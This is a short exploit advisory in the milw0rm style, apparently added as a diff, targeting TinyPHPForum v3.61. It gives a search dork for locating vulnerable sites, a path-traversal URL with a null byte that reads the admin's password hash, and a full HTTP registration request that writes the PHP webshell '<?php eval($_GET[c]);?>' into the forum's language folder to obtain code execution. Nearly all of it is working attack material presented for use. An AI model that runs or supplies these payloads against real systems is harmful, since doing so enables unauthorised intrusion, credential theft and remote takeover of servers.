@@ -1,0 +1,80 @@
+===============================================================================================
+
+Found : brain[pillow]
+Dork  : "Powered by TinyPHPForum v3.61"
+Visit : brainpillow.cc, forum.antichat.ru, raz0r.name
+Mail  : brainpillow@gmail.com
+
+===============================================================================================
+
+        File read (f.e. file with admin's hash):
+
+/index.php?f=1&t=8../../../../users/admin.hash%00
+
+===============================================================================================
+
+        Code exec:
+
+Just send this fucking evil packet for registration and the shell will be created there: /lang/cekac.php.skin?c=[eval code]
+
+POST /updatepf.php HTTP/1.1
+User-Agent: Opera/9.64 (Windows NT 5.1; U; ru) Presto/2.1.1
+Host: localhost
+Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1
+Referer: http://localhost/profile.php?action=new
+Cookie: PHPSESSID=a2b64d278abd18347c1fd3c27a6dc1f2;
+Connection: Keep-Alive
+Content-Length: 1235
+Content-Type: multipart/form-data; boundary=----------feIyX3Pd15MPzClqGeALKe
+
+------------feIyX3Pd15MPzClqGeALKe
+Content-Disposition: form-data; name="sessionid"
+
+a2b64d278abd18347c1fd3c27a6dc1f2
+------------feIyX3Pd15MPzClqGeALKe
+Content-Disposition: form-data; name="uname"
+
+../lang/cekac.php
+------------feIyX3Pd15MPzClqGeALKe
+Content-Disposition: form-data; name="ulang"
+
+big5
+------------feIyX3Pd15MPzClqGeALKe
+Content-Disposition: form-data; name="uskin"
+
+<?php eval($_GET[c]);?>
+------------feIyX3Pd15MPzClqGeALKe
+Content-Disposition: form-data; name="email"
+
+qwe@qwe.net
+------------feIyX3Pd15MPzClqGeALKe
+Content-Disposition: form-data; name="p1"
+
+123qwe
+------------feIyX3Pd15MPzClqGeALKe
+Content-Disposition: form-data; name="p2"
+
+123qwe
+------------feIyX3Pd15MPzClqGeALKe
+Content-Disposition: form-data; name="stat"
+
+hack the planet
+------------feIyX3Pd15MPzClqGeALKe
+Content-Disposition: form-data; name="avatar"
+
+image/avatars/bird1.jpg
+------------feIyX3Pd15MPzClqGeALKe
+Content-Disposition: form-data; name="MAX_FILE_SIZE"
+
+10240
+------------feIyX3Pd15MPzClqGeALKe
+Content-Disposition: form-data; name="userfile"; filename=""
+
+
+------------feIyX3Pd15MPzClqGeALKe
+Content-Disposition: form-data; name="type"
+
+new
+------------feIyX3Pd15MPzClqGeALKe--
+
+# milw0rm.com [2009-04-01]
